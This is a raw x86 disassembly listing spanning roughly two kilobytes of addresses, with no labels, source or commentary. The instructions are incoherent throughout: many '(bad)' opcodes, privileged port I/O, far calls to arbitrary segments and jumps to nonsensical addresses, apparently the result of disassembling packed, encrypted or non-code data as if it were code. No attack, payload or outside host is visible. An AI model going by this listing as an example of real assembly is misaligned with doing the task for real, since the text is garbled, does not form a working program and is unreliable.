  404191:	sub    BYTE PTR [eax-0x38],al
  404194:	add    BYTE PTR [ebp+0x22fb8f11],cl
  40419a:	ds js  0x4041b0
  40419d:	in     eax,0xbf
  40419f:	jp     0x4041a3
  4041a1:	inc    esp
  4041a2:	sbb    ebp,DWORD PTR [ebp+0x75684822]
  4041a8:	(bad)  
  4041a9:	rol    DWORD PTR [edi+0x36403b2a],1
  4041af:	and    al,0x9e
  4041b1:	xchg   ecx,eax
  4041b2:	fisttp DWORD PTR [edi-0x473f7bf2]
  4041b8:	xor    eax,0x137fa3c9
  4041bd:	aaa    
  4041be:	fdiv   QWORD PTR [esi]
  4041c0:	test   al,0xef
  4041c2:	popa   
  4041c3:	ds arpl WORD PTR cs:[edx+0x6a35600a],ax
  4041cb:	push   eax
  4041cc:	push   ss
  4041cd:	mov    esi,0x62faf2a3
  4041d2:	add    eax,0xc974075e
  4041d7:	jnp    0x4041b5
  4041d9:	lock sub BYTE PTR [edi-0x173fd914],ch
  4041e0:	sti    
  4041e1:	pop    eax
  4041e2:	pop    eax
  4041e3:	repz addr16 inc eax
  4041e6:	sub    DWORD PTR [esi-0x64],edx
  4041e9:	mov    bl,0x9e
  4041eb:	rol    BYTE PTR [esi+0x3331bce9],1
  4041f1:	add    al,0xe3
  4041f3:	ret    0x6b6d
  4041f6:	xor    DWORD PTR [esi+0x1e],eax
  4041f9:	add    eax,0x34b18d3
  4041fe:	and    DWORD PTR [eax],esi
  404200:	cmp    al,BYTE PTR [edx-0x68719018]
  404206:	call   0x971c7bdf
  40420b:	sar    esp,1
  40420d:	xchg   ecx,eax
  40420e:	mov    eax,0x61f6cd7c
  404213:	mov    cl,0x6b
  404215:	aad    0xa7
  404217:	mov    cl,0x4e
  404219:	mov    cl,0x44
  40421b:	push   esp
  40421c:	push   esi
  40421d:	pushw  es
  40421f:	out    dx,eax
  404220:	cmp    ebx,DWORD PTR [ecx]
  404222:	fs jmp 0x4041d2
  404225:	add    DWORD PTR [edx],ebp
  404227:	add    eax,0x89d592c9
  40422c:	aas    
  40422d:	push   es
  40422e:	gs aas 
  404230:	mov    ecx,0xbcd8b5c
  404235:	xchg   DWORD PTR [edi+edx*8+0x21765867],edi
  40423c:	or     al,cl
  40423e:	cmc    
  40423f:	fs sbb al,0x2
  404242:	jp     0x40425f
  404244:	mov    eax,ds:0x68fbd1dc
  404249:	sti    
  40424a:	sbb    esi,DWORD PTR [edi-0x72c0ffe2]
  404250:	stos   BYTE PTR es:[edi],al
  404251:	mov    ch,0xa2
  404253:	out    0x43,eax
  404255:	repz das 
  404257:	int3   
  404258:	push   0x1cdae9c1
  40425d:	aam    0xce
  40425f:	sub    bl,ah
  404261:	(bad)  
  404263:	or     BYTE PTR [ecx+0x426876d1],dl
  404269:	jmp    0x55ea604
  40426e:	pop    eax
  40426f:	clc    
  404270:	je     0x4042d1
  404272:	sahf   
  404273:	aaa    
  404274:	shl    DWORD PTR [ecx-0x47447091],1
  40427a:	jecxz  0x4042ce
  40427c:	pop    edi
  40427d:	push   esp
  40427e:	addr16 jne 0x404226
  404281:	sub    cl,BYTE PTR [edi+0x50856d7f]
  404287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404288:	adc    BYTE PTR gs:[ebp-0x45],0x56
  40428d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40428e:	xor    ebp,DWORD PTR [ecx]
  404290:	jmp    0xd223d11b
  404295:	inc    ebx
  404296:	mov    bl,0xa2
  404298:	xchg   esp,eax
  404299:	mov    ebp,edi
  40429b:	scas   al,BYTE PTR es:[edi]
  40429c:	push   0x8c446ae9
  4042a1:	stos   DWORD PTR es:[edi],eax
  4042a2:	fwait
  4042a3:	jmp    0x404238
  4042a5:	xor    DWORD PTR [edi+eax*2-0x6d459a14],ebx
  4042ac:	jmp    0x4042d8
  4042ae:	adc    esp,ebx
  4042b0:	dec    ecx
  4042b1:	xchg   BYTE PTR [edi+0x37],ah
  4042b4:	xchg   esi,eax
  4042b5:	jle    0x40425b
  4042b7:	dec    eax
  4042b8:	scas   eax,DWORD PTR es:[edi]
  4042b9:	sbb    eax,0x4e5766be
  4042be:	dec    ecx
  4042bf:	xchg   ebp,eax
  4042c0:	mov    ebx,0xe85d61c5
  4042c5:	loope  0x404304
  4042c7:	inc    edx
  4042c8:	mov    BYTE PTR [edx+esi*8],cl
  4042cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042cc:	add    esp,ebp
  4042ce:	arpl   WORD PTR [ebx-0x2e],di
  4042d1:	sahf   
  4042d2:	mov    ecx,0xa7a6c5c7
  4042d7:	test   al,0x83
  4042d9:	mov    ebx,0xbaaf55c8
  4042de:	leave  
  4042df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042e0:	pop    eax
  4042e1:	sti    
  4042e2:	dec    esp
  4042e3:	cmp    esp,esp
  4042e5:	mov    ds:0x5a093b5b,al
  4042ea:	cdq    
  4042eb:	imul   esp,DWORD PTR [esi-0x55],0xa6092025
  4042f2:	dec    esp
  4042f3:	dec    esp
  4042f4:	std    
  4042f5:	lods   eax,DWORD PTR ds:[esi]
  4042f6:	std    
  4042f7:	dec    esi
  4042f8:	(bad)  ds:[ecx-0x10]
  4042fc:	inc    ebx
  4042fd:	push   ebx
  4042fe:	sbb    eax,0x46373a9
  404303:	mov    dl,0xf7
  404305:	stos   DWORD PTR es:[edi],eax
  404306:	imul   ecx,ecx,0x1d256851
  40430c:	mov    esp,0x4639be68
  404311:	icebp  
  404312:	loop   0x404342
  404314:	jle    0x404354
  404316:	jne    0x404375
  404318:	mov    al,ds:0xd4f75be1
  40431d:	pop    eax
  40431e:	adc    ebx,0x1a64dc39
  404324:	push   0xffffffe4
  404326:	outs   dx,BYTE PTR ds:[esi]
  404327:	ss call 0x1b7342b5
  40432d:	test   ch,cl
  40432f:	dec    edi
  404330:	ds cmova esi,ebx
  404334:	imul   esi,DWORD PTR [edx],0x38fe7c50
  40433a:	or     BYTE PTR [ebx-0x631f5089],bh
  404340:	sub    BYTE PTR [ebp-0xa],al
  404343:	mov    eax,ds:0x88e3316
  404348:	(bad)  
  404349:	pusha  
  40434a:	sub    BYTE PTR es:[ebp-0x71],ch
  40434e:	mov    eax,ds:0xb8882134
  404353:	fbld   TBYTE PTR [ebp-0x60]
  404356:	and    ebx,DWORD PTR [edx]
  404358:	push   ebx
  404359:	icebp  
  40435a:	mov    ah,0x69
  40435c:	mov    cl,0x4a
  40435e:	push   cs
  40435f:	pop    ebp
  404360:	iret   
  404361:	and    edi,DWORD PTR [ebp-0x3f2bb12b]
  404367:	pop    edx
  404368:	(bad)  
  404369:	popf   
  40436a:	mov    edx,0x7c8ea86e
  40436f:	pop    edx
  404370:	popf   
  404371:	dec    ebx
  404372:	clc    
  404373:	dec    ebx
  404374:	mov    BYTE PTR [edx-0x687fcce4],dl
  40437a:	jmp    0x4042fc
  40437c:	scas   al,BYTE PTR es:[edi]
  40437d:	out    0x72,eax
  40437f:	mov    DWORD PTR [ecx],eax
  404381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404382:	in     al,0xd3
  404384:	fst    QWORD PTR [edi+edi*4]
  404387:	cmp    DWORD PTR [edi+eax*2-0x6965df32],0x47d86c67
  404392:	push   es
  404393:	sbb    ah,BYTE PTR [edi+0x61780d]
  404399:	es loop 0x404395
  40439c:	sub    al,0xbc
  40439e:	xor    DWORD PTR [ebp+0x3],ebp
  4043a1:	sbb    ecx,0x5f
  4043a4:	jbe    0x404392
  4043a6:	popa   
  4043a7:	adc    eax,0x6293c7c7
  4043ac:	jno    0x40440a
  4043ae:	shl    DWORD PTR [ebx-0x52],0xad
  4043b2:	lods   eax,DWORD PTR ds:[esi]
  4043b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043b4:	and    dh,BYTE PTR [eax-0x51]
  4043b7:	test   eax,0x1ab045dd
  4043bc:	or     BYTE PTR [ebx],ch
  4043be:	sbb    eax,DWORD PTR [ecx+0x5e]
  4043c1:	in     al,0xd2
  4043c3:	inc    edi
  4043c4:	or     al,ch
  4043c6:	fwait
  4043c7:	retf   0x28d
  4043ca:	pop    es
  4043cb:	lds    esp,FWORD PTR [ebx-0x7d8b73c6]
  4043d1:	lods   al,BYTE PTR ds:[esi]
  4043d2:	pop    edi
  4043d3:	test   eax,0x647c284f
  4043d8:	xchg   edi,eax
  4043d9:	pop    eax
  4043da:	mov    dl,BYTE PTR [eax+ebx*1-0x19ca63d5]
  4043e1:	sub    al,0x8
  4043e3:	jge    0x404406
  4043e5:	or     bh,BYTE PTR [edx-0x34]
  4043e8:	or     BYTE PTR [eax],ch
  4043ea:	cmp    BYTE PTR [esi*2+0x1fbf961a],ch
  4043f1:	data16 loop 0x404401
  4043f4:	sar    DWORD PTR [esi+0x6d],cl
  4043f7:	mov    esi,0x5e6b0d7c
  4043fc:	ins    BYTE PTR es:[edi],dx
  4043fd:	in     al,0xa8
  4043ff:	les    eax,FWORD PTR [edx]
  404401:	test   al,0x7a
  404403:	sub    al,0x1
  404405:	mov    esp,0x506f64d6
  40440a:	fbld   TBYTE PTR [ebx+esi*1]
  40440d:	xchg   edx,eax
  40440e:	hlt    
  40440f:	pop    eax
  404410:	fiadd  DWORD PTR [eax-0x3]
  404413:	add    BYTE PTR [edx-0x44275f58],ah
  404419:	les    esp,FWORD PTR ds:0xebcfc65e
  40441f:	push   0xffffffc4
  404421:	add    al,BYTE PTR [edi+edx*8-0x13]
  404425:	dec    ebp
  404426:	or     al,0x4c
  404428:	and    bh,ah
  40442a:	aaa    
  40442b:	inc    eax
  40442c:	mov    bl,0xbb
  40442e:	jle    0x4044a9
  404430:	pop    ebx
  404431:	dec    ecx
  404432:	int3   
  404433:	cmpps  xmm2,XMMWORD PTR [esi+0x68778c33],0x42
  40443b:	jle    0x404407
  40443d:	(bad)  
  40443e:	fimul  DWORD PTR [edx]
  404440:	inc    edi
  404441:	scas   eax,DWORD PTR es:[edi]
  404442:	jle    0x404414
  404444:	dec    edi
  404445:	dec    edx
  404446:	fcmovnbe st,st(6)
  404448:	inc    ebx
  404449:	iret   
  40444a:	cmp    eax,0xebce418f
  40444f:	xor    dh,ah
  404451:	aas    
  404452:	mov    edx,0x3980936b
  404457:	lahf   
  404458:	adc    al,0x6a
  40445a:	cli    
  40445b:	out    dx,al
  40445c:	mov    eax,ds:0xc5a62b90
  404461:	dec    esi
  404462:	stos   DWORD PTR es:[edi],eax
  404463:	sbb    DWORD PTR [edi+0x5e4c6bfb],0xffffffb2
  40446a:	xchg   ebp,eax
  40446b:	mov    dh,0xb1
  40446d:	fwait
  40446e:	mov    bl,0xaa
  404470:	add    dh,0x67
  404473:	inc    esi
  404474:	les    edx,FWORD PTR [edi]
  404476:	int3   
  404477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404478:	mov    al,ds:0x4f861fb1
  40447d:	push   ecx
  40447e:	das    
  40447f:	adc    BYTE PTR [ecx+0x22],dl
  404482:	arpl   WORD PTR [ecx],dx
  404484:	xchg   edi,eax
  404485:	mov    ebx,0x5fc8ac60
  40448a:	data16 lahf 
  40448c:	push   eax
  40448d:	fnstenvw [eax]
  404490:	call   0xc175:0x8096c69b
  404497:	js     0x404479
  404499:	icebp  
  40449a:	test   al,0x82
  40449c:	mov    al,0x48
  40449e:	and    BYTE PTR [ebp+0x7c],ch
  4044a1:	mov    esi,eax
  4044a3:	cmp    DWORD PTR [ecx+0x29561ad2],ebx
  4044a9:	test   eax,0x9434e9ba
  4044ae:	sbb    al,0xf0
  4044b0:	ror    DWORD PTR [edi+edx*1-0xdac6d9a],1
  4044b7:	push   0x3d327f65
  4044bc:	and    ecx,esp
  4044be:	sub    eax,0x19526863
  4044c3:	mov    cl,0x16
  4044c5:	push   eax
  4044c6:	mov    al,ds:0xa23528fd
  4044cb:	(bad)  
  4044cc:	cmp    DWORD PTR cs:[edx-0xc3360d2],0xffffffc6
  4044d4:	je     0x404526
  4044d6:	cli    
  4044d7:	rcl    BYTE PTR [esi],1
  4044d9:	xchg   edi,eax
  4044da:	xlat   BYTE PTR ds:[ebx]
  4044db:	xor    DWORD PTR [edx-0x7f33d4b1],esi
  4044e1:	sbb    ecx,ecx
  4044e3:	ret    0x9c00
  4044e6:	jg     0x4044e5
  4044e8:	jle    0x40448d
  4044ea:	ja     0x40453d
  4044ec:	add    ch,BYTE PTR [ebx]
  4044ee:	xlat   BYTE PTR ds:[ebx]
  4044ef:	aad    0x9f
  4044f1:	mov    esi,0x8cc444a0
  4044f6:	xor    BYTE PTR [eax+0x59],ch
  4044f9:	test   al,0x49
  4044fb:	mov    edi,0xc1757ee3
  404500:	les    edi,FWORD PTR [ecx-0x4b9aa253]
  404506:	and    BYTE PTR [edx-0x19289738],0x4e
  40450d:	shl    ebp,1
  40450f:	ds dec ebp
  404511:	in     eax,dx
  404512:	cwde   
  404513:	clc    
  404514:	je     0x4044a7
  404516:	or     ebx,esp
  404518:	pop    edx
  404519:	jle    0x4044b1
  40451b:	push   edx
  40451c:	in     al,0x62
  40451e:	outs   dx,DWORD PTR ds:[esi]
  40451f:	sbb    al,0x53
  404521:	jg     0x404535
  404523:	cmc    
  404524:	in     eax,dx
  404525:	xchg   edx,eax
  404526:	aas    
  404527:	imul   edi,DWORD PTR [ecx],0xffffffb0
  40452a:	ss cld 
  40452c:	cmp    al,0x1e
  40452e:	icebp  
  40452f:	data16 mov ch,0xbf
  404532:	bound  edi,QWORD PTR [edi+eax*2+0x1e]
  404536:	outs   dx,BYTE PTR ds:[esi]
  404537:	fadd   DWORD PTR [ecx+0x39d2c699]
  40453d:	repz push ss
  40453f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404540:	pop    edi
  404541:	cmp    BYTE PTR [eax],bh
  404543:	mov    WORD PTR [esp+ecx*1-0x65],fs
  404547:	jl     0x4045b1
  404549:	out    0xd4,al
  40454b:	and    eax,0xa2c04038
  404550:	sub    al,0xfd
  404552:	adc    eax,0x2432a4ac
  404557:	pushf  
  404558:	pop    esi
  404559:	ds gs jbe 0x4045a3
  40455d:	cmp    edx,DWORD PTR [edx]
  40455f:	repnz fmul st,st(5)
  404562:	dec    esp
  404563:	iret   
  404564:	dec    ebx
  404565:	enter  0xf649,0x19
  404569:	div    BYTE PTR [esi]
  40456b:	dec    edi
  40456c:	pop    ecx
  40456d:	lahf   
  40456e:	lods   eax,DWORD PTR ds:[esi]
  40456f:	fstp   QWORD PTR ds:[edi+0x2b6e4687]
  404576:	in     eax,0xe4
  404578:	xor    eax,0xbac048e
  40457d:	xor    BYTE PTR [edi-0x266cf9ae],ah
  404583:	pop    es
  404584:	jecxz  0x40459c
  404586:	(bad)
  40458a:	ins    BYTE PTR es:[edi],dx
  40458b:	jns    0x4045d9
  40458d:	pop    ss
  40458e:	jns    0x40459a
  404590:	dec    ebp
  404591:	mov    DWORD PTR [esi+0x3a4b81fe],ebx
  404597:	es jne 0x404618
  40459a:	sbb    edx,DWORD PTR ds:0xa076d2ef
  4045a0:	call   0x4c67:0xc4fcaeea
  4045a7:	mov    ah,0xab
  4045a9:	mov    dl,0xdf
  4045ab:	add    BYTE PTR [eax],al
  4045ad:	inc    edx
  4045ae:	leave  
  4045af:	(bad)  
  4045b0:	dec    eax
  4045b1:	sub    al,0x44
  4045b3:	pop    eax
  4045b4:	pop    ebp
  4045b5:	mov    esp,0xd4ae07ed
  4045ba:	adc    edi,esi
  4045bc:	stos   BYTE PTR es:[edi],al
  4045bd:	mov    eax,0x3b673340
  4045c2:	fidivr DWORD PTR ds:0x3df49186
  4045c8:	idiv   DWORD PTR [ecx]
  4045ca:	test   esp,eax
  4045cc:	push   edi
  4045cd:	push   ss
  4045ce:	push   0xffffffcb
  4045d0:	jnp    0x40455d
  4045d2:	aaa    
  4045d3:	sub    eax,0x3f6002d3
  4045d8:	or     cl,ah
  4045da:	add    eax,0x9211a1d1
  4045df:	dec    edx
  4045e0:	clc    
  4045e1:	mov    bh,0xac
  4045e3:	push   esp
  4045e4:	mov    ebx,0xfc1e0558
  4045e9:	xor    edi,DWORD PTR [edi]
  4045eb:	cmp    al,0x23
  4045ed:	out    dx,eax
  4045ee:	sti    
  4045ef:	(bad)  
  4045f0:	mov    esi,DWORD PTR [esi]
  4045f2:	fimul  DWORD PTR [ecx+edx*1]
  4045f5:	pop    eax
  4045f6:	dec    esi
  4045f7:	push   ecx
  4045f8:	out    0xd,al
  4045fa:	push   0x331bd434
  4045ff:	test   BYTE PTR [edx+eiz*2],dh
  404602:	cdq    
  404603:	dec    edi
  404604:	in     al,dx
  404605:	dec    esi
  404606:	and    ebx,DWORD PTR [esp+ebp*2-0x6088dae9]
  40460d:	arpl   WORD PTR [ecx-0x3f21dd2d],si
  404613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404614:	iret   
  404615:	push   ebp
  404616:	pop    edx
  404617:	push   edi
  404618:	mov    ds:0x33ae678f,al
  40461d:	(bad)  
  40461f:	push   ds
  404620:	sub    cl,ch
  404622:	cld    
  404623:	sbb    bl,dl
  404625:	jp     0x4045c6
  404627:	sbb    ebx,edx
  404629:	sti    
  40462a:	sub    eax,0x4c467c0e
  40462f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404630:	icebp  
  404631:	adc    BYTE PTR [ecx+ebp*1-0x1745ae79],ch
  404638:	mov    al,ds:0x62ccd02b
  40463d:	pop    ds
  40463e:	adc    eax,DWORD PTR [ecx+0xe77f8e4]
  404644:	rol    DWORD PTR [eax+0x727f5bf],0x7c
  40464b:	pop    ebx
  40464c:	(bad)
  404650:	mov    ds:0xa78ac33d,al
  404655:	(bad)  
  404656:	loopne 0x40460b
  404658:	imul   esp,ebp,0xffffffd9
  40465b:	idiv   BYTE PTR [eax]
  40465d:	daa    
  40465e:	out    dx,al
  40465f:	inc    esp
  404660:	js     0x4046ca
  404662:	in     al,dx
  404663:	fwait
  404664:	jmp    0x40465c
  404666:	data16 jns 0x40466f
  404669:	push   edi
  40466a:	call   0x13cda00d
  40466f:	jp     0x4046c1
  404671:	int3   
  404672:	inc    eax
  404673:	pop    eax
  404674:	xor    BYTE PTR [edx-0x5c8936c2],ah
  40467a:	xchg   edx,eax
  40467b:	and    ebx,eax
  40467d:	gs jmp 0xb8b8986a
  404683:	rcl    BYTE PTR [esi-0x4e7ab553],cl
  404689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40468a:	in     al,dx
  40468b:	inc    edx
  40468c:	in     eax,dx
  40468d:	jno    0x4046ca
  40468f:	adc    DWORD PTR [ecx-0x5e7841f6],esi
  404695:	xchg   ebx,eax
  404696:	call   0x2741:0xa155b039
  40469d:	or     al,0x90
  40469f:	(bad)  
  4046a0:	xchg   ebx,eax
  4046a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046a2:	push   eax
  4046a3:	mov    esi,0x2dfa49cc
  4046a8:	push   cs
  4046a9:	add    al,BYTE PTR [ebp+ecx*4-0x427b0a8d]
  4046b0:	sub    DWORD PTR [ebx-0x16],0x9bebf35e
  4046b7:	pop    eax
  4046b8:	add    BYTE PTR [ecx+0x65],ch
  4046bb:	jb     0x4046a0
  4046bd:	loope  0x4046f4
  4046bf:	adc    dh,BYTE PTR [ebx]
  4046c1:	cmp    esp,DWORD PTR [eax-0x54060b45]
  4046c7:	inc    ecx
  4046c8:	sub    eax,DWORD PTR [edx-0x68]
  4046cb:	push   0x8
  4046cd:	sub    eax,0xfa9950a
  4046d2:	mov    bh,0x5f
  4046d4:	jg     0x4046aa
  4046d6:	out    dx,eax
  4046d7:	add    BYTE PTR [esp+ebx*8+0x4e],bh
  4046db:	retf   
  4046dc:	add    eax,0xf98dc89a
  4046e1:	fdiv   QWORD PTR [esi+0x33fb59c2]
  4046e7:	aam    0x77
  4046e9:	cld    
  4046ea:	lds    esp,FWORD PTR [eax-0x53]
  4046ed:	pusha  
  4046ee:	call   0xe73fb2f
  4046f3:	sar    BYTE PTR [edi-0xf],0x15
  4046f7:	addr16 mov esi,0x866672d0
  4046fd:	outs   dx,DWORD PTR ds:[esi]
  4046fe:	(bad)  
  4046ff:	loop   0x404773
  404701:	jl     0x4046af
  404703:	cmc    
  404704:	test   DWORD PTR [edx],0xd55d6708
  40470a:	lahf   
  40470b:	gs xchg bh,cl
  40470e:	mov    esp,0x483aba83
  404713:	pop    ecx
  404714:	iret   
  404715:	add    al,bh
  404717:	adc    esp,DWORD PTR [ebp+0x312ead4b]
  40471d:	pop    eax
  40471e:	mov    esi,0x68d25494
  404723:	pop    ss
  404724:	lds    esi,FWORD PTR [edx-0x669dd91e]
  40472a:	mov    edx,DWORD PTR [edi]
  40472c:	or     BYTE PTR [edi+0x144391b0],ch
  404732:	inc    esp
  404733:	rol    DWORD PTR [ecx-0x17f32813],1
  404739:	mov    ebx,0xf4f77a0a
  40473e:	dec    edx
  40473f:	add    al,0x9a
  404741:	mov    dl,0x7c
  404743:	data16 je 0x4046ec
  404746:	push   edx
  404747:	inc    ebp
  404748:	lea    ebx,[edx]
  40474a:	mov    esp,0x87c65169
  40474f:	stos   BYTE PTR es:[edi],al
  404750:	fnstcw WORD PTR [esi-0x2]
  404753:	shr    BYTE PTR [eax+0x4d],1
  404756:	lea    edi,[edx-0x73ac2254]
  40475c:	adc    eax,0x19793c1f
  404761:	out    dx,eax
  404762:	adc    DWORD PTR [ebx-0x78a19ecb],ebp
  404768:	stos   BYTE PTR es:[edi],al
  404769:	leave  
  40476a:	inc    edx
  40476b:	mov    ecx,ecx
  40476d:	stos   DWORD PTR es:[edi],eax
  40476e:	jnp    0x404702
  404770:	pop    eax
  404771:	or     al,0x56
  404773:	test   al,0xa5
  404775:	jns    0x40478b
  404777:	sbb    eax,0x4e6881dc
  40477c:	jg     0x404793
  40477e:	repnz fisttp DWORD PTR [edx+eiz*8]
  404782:	test   eax,0x126ddc1a
  404787:	mov    edi,0x65e0d822
  40478c:	icebp  
  40478d:	inc    edx
  40478e:	rcr    DWORD PTR [edi],cl
  404790:	test   eax,0xa4881499
  404795:	mov    DWORD PTR ds:0x158f417a,ecx
  40479b:	and    ebx,DWORD PTR [ebx+0x65]
  40479e:	mov    dh,BYTE PTR [edx]
  4047a0:	and    BYTE PTR [esi-0x3d8abc3d],0x64
  4047a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047a8:	pop    edx
  4047a9:	and    ch,BYTE PTR [eax]
  4047ab:	and    ebx,DWORD PTR [esi]
  4047ad:	sbb    ah,dh
  4047af:	call   0xaa81af37
  4047b4:	in     al,0xbb
  4047b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047b7:	out    0x28,al
  4047b9:	popa   
  4047ba:	ja     0x4047d5
  4047bc:	mov    WORD PTR [ecx+0x2d],fs
  4047bf:	mov    bh,0x8
  4047c1:	pop    es
  4047c2:	in     al,0x56
  4047c4:	sbb    al,0x66
  4047c6:	and    cl,BYTE PTR [ecx+eax*4+0x692dc8ae]
  4047cd:	push   es
  4047ce:	push   0x9
  4047d0:	mov    dl,0x12
  4047d2:	leave  
  4047d3:	inc    eax
  4047d4:	jbe    0x4047c6
  4047d6:	mov    edi,0x628d5ab8
  4047db:	jp     0x4047ae
  4047dd:	sub    bl,bh
  4047df:	call   0xe3ad:0x304a1652
  4047e6:	outs   dx,DWORD PTR ds:[esi]
  4047e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047e8:	cdq    
  4047e9:	das    
  4047ea:	stos   DWORD PTR es:[edi],eax
  4047eb:	and    DWORD PTR [ecx+ebx*2+0x173e4c58],esi
  4047f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047f3:	imul   eax,DWORD PTR [esi+0x10],0xb3b3fbfc
  4047fa:	mov    ds:0x764055a2,eax
  4047ff:	loopne 0x404827
  404801:	add    DWORD PTR [eax-0x1cdd69ac],eax
  404807:	push   0xc1261e00
  40480c:	mov    ds:0xb4c73e4f,eax
  404811:	jp     0x404804
  404813:	repz push 0x234dfe7f
  404819:	icebp  
  40481a:	je     0x404860
  40481c:	xchg   ecx,eax
  40481d:	mov    esi,0xf1ed1bbb
  404822:	push   edx
  404823:	or     eax,0xaf0813d
  404828:	mov    edi,0x7b79f3e1
  40482d:	mov    dh,0x7e
  40482f:	out    dx,al
  404830:	outs   dx,DWORD PTR ds:[esi]
  404831:	bound  eax,QWORD PTR [ebx]
  404833:	int3   
  404834:	pop    esi
  404835:	jns    0x4047e5
  404837:	es nop
  404839:	adc    bl,al
  40483b:	dec    esp
  40483c:	dec    edx
  40483d:	(bad)
  404840:	addr16 pop edi
  404842:	ficomp WORD PTR [esi]
  404844:	imul   ecx,DWORD PTR [ebx-0x4b6017aa],0x61
  40484b:	xlat   BYTE PTR ds:[ebx]
  40484c:	es cld 
  40484e:	sub    BYTE PTR [ecx+0xa],0x70
  404852:	jae    0x4048a1
  404854:	cmp    ah,ah
  404856:	jae    0x404822
  404858:	sub    al,0x56
  40485a:	mov    al,ds:0xbfaa9afc
  40485f:	pop    edi
  404860:	fsub   QWORD PTR [edi-0x37]
  404863:	sbb    ecx,DWORD PTR [eax-0x7c]
  404866:	cmp    BYTE PTR [edx-0x141d0017],dh
  40486c:	in     al,0x53
  40486e:	add    eax,0xa428e7c3
  404873:	clc    
  404874:	test   al,0xa6
  404876:	aam    0x9b
  404878:	test   DWORD PTR [eax],ebp
  40487a:	mov    esp,0xfcb0c48f
  40487f:	jne    0x4048ed
  404881:	loope  0x4048ba
  404883:	xchg   ebp,eax
  404884:	mov    ds:0xdd34ccdd,al
  404889:	retf   0x1b9
  40488c:	push   ebp
  40488d:	fmul   st(0),st
  40488f:	daa    
  404890:	xor    esi,DWORD PTR [ecx+0x3e2d2744]
  404896:	outs   dx,DWORD PTR gs:[esi]
  404898:	jecxz  0x404842
  40489a:	xchg   DWORD PTR [ecx],edx
  40489c:	cmp    BYTE PTR [eax+0x1d486637],ch
  4048a2:	gs sub eax,0xe24934a6
  4048a8:	xchg   esi,eax
  4048a9:	cdq    
  4048aa:	int    0x7a
  4048ac:	fs js  0x40491e
  4048af:	jbe    0x404851
  4048b1:	add    al,0x7f
  4048b3:	xchg   si,ax
  4048b5:	push   es
  4048b6:	adc    dh,BYTE PTR [ebp-0xfc36a8d]
  4048bc:	popa   
  4048bd:	mov    eax,0x7137fefe
  4048c2:	pushf  
  4048c3:	jno    0x4048aa
  4048c5:	(bad)  
  4048c7:	cmp    DWORD PTR [eax+eiz*1+0x11],0xee848779
  4048cf:	mov    edx,0x3113fb66
  4048d4:	inc    edi
  4048d5:	test   esi,esi
  4048d7:	push   eax
  4048d8:	add    DWORD PTR [ebp+0x70d5f22f],esp
  4048de:	stos   BYTE PTR es:[edi],al
  4048df:	cmc    
  4048e0:	pop    ss
  4048e1:	ins    DWORD PTR es:[edi],dx
  4048e2:	shr    ecx,1
  4048e4:	mov    BYTE PTR [eax],dh
  4048e6:	bnd jnp 0x40489d
  4048e9:	mov    al,ds:0xb05227d2
  4048ee:	lahf   
  4048ef:	pop    es
  4048f0:	cmp    eax,0x632105fe
  4048f5:	cld    
  4048f6:	sub    DWORD PTR [eax-0x104262ed],ecx
  4048fc:	jmp    0xd599:0x71bc889a
  404903:	imul   ecx,ecx,0xffffffcb
  404906:	div    DWORD PTR [esi+0x3f8010fc]
  40490c:	pop    edi
  40490d:	aaa    
  40490e:	popa   
  40490f:	rcr    DWORD PTR [ebx+ebp*2],cl
  404912:	jnp    0x404958
  404914:	setne  BYTE PTR [edi-0x26ade722]
  40491b:	aam    0x51
  40491d:	popa   
  40491e:	(bad)  ds:0xeb7e81c6
  404924:	pop    es
  404925:	push   ds
  404926:	cmp    eax,0xb71714b2
  40492b:	mov    edx,0x3071232
  404930:	jae    0x404901
  404932:	push   es
  404933:	fbstp  TBYTE PTR [ebx]
  404935:	sub    eax,0x2f4290d4
  40493a:	es dec esi
  40493c:	push   edi
  40493d:	xchg   ebp,eax
  40493e:	mov    cl,0x6f
  404940:	out    dx,eax
  404941:	jg     0x404945
  404943:	fsub   QWORD PTR [eax+0x62]
  404946:	push   edi
  404947:	push   ds
  404948:	nop
  404949:	icebp  
  40494a:	repnz in al,0x60
  40494d:	or     eax,0x508c35b9
  404952:	xchg   DWORD PTR [esp+ebp*4],esi
  404955:	in     al,dx
  404956:	adc    DWORD PTR [ebp-0xe],edi
  404959:	std    
  40495a:	dec    eax
  40495b:	mov    bh,0xba
  40495d:	mov    ah,0xde
  40495f:	xchg   esp,ebx
  404961:	mov    cl,0xbb
  404963:	inc    ebx
  404964:	and    DWORD PTR [ebp+0xb],eax
  404967:	and    al,0xbf
  404969:	(bad)  
  40496a:	dec    edx
  40496b:	es jbe 0x404943
  40496e:	enter  0xc614,0x50
  404972:	xor    DWORD PTR [esi-0x59],0x831e5a1b
  404979:	(bad)  
  40497a:	pop    esi
  40497b:	push   esp
  40497c:	int3   
  40497d:	jns    0x40498c
  40497f:	mov    dl,0xfc
  404981:	sub    bl,BYTE PTR ds:0x6bbd0b46
  404987:	retf   
  404988:	or     eax,0xb4813ede
  40498d:	das    
  40498e:	mov    eax,0x20a27474
  404993:	ret    
  404994:	out    0xb2,eax
  404996:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  404998:	cdq    
  404999:	inc    ecx
  40499a:	push   ds
  40499b:	sub    DWORD PTR [ebx+0x43],edi
  40499e:	addr16 cwde 
  4049a0:	das    
  4049a1:	retf   
  4049a2:	scas   eax,DWORD PTR es:[edi]
  4049a3:	or     eax,0xe46d01e7
  4049a8:	(bad)  
  4049a9:	faddp  st(4),st
  4049ab:	retf   
  4049ac:	inc    eax
